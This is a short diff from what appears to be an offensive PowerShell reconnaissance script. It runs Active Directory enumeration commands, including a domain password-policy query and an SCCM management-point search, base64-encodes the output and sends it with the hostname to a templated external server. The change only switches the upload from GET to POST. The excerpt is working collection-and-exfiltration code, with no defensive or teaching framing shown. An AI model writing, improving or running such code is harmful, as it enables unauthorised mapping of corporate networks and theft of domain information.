@@ -70,4 +70,4 @@ DOMAIN_net_accounts_domain = Encode64(net accounts /domain);
 DOMAIN_SCCM_hunter = Encode64(([ADSISearcher]("objectClass=mSSMSManagementPoint")).FindAll() | % {$_.Properties});
 };
 $URL='SERVER_PROTOCOL://SERVER_EXTERNAL_IP:SERVER_EXTERNAL_PORT/?';
-foreach($key in $commands.Keys){$enc_command=$commands[$key];$params=@{hostname=$hostname;$key=$enc_command};$headers=@{'Proof'='1'};Invoke-WebRequest -Uri $URL -Headers $headers -Method GET -Body $params;};
+foreach($key in $commands.Keys){$enc_command=$commands[$key];$params=@{hostname=$hostname;$key=$enc_command};$headers=@{'Proof'='1'};Invoke-WebRequest -Uri $URL -Headers $headers -Method POST -Body $params;};
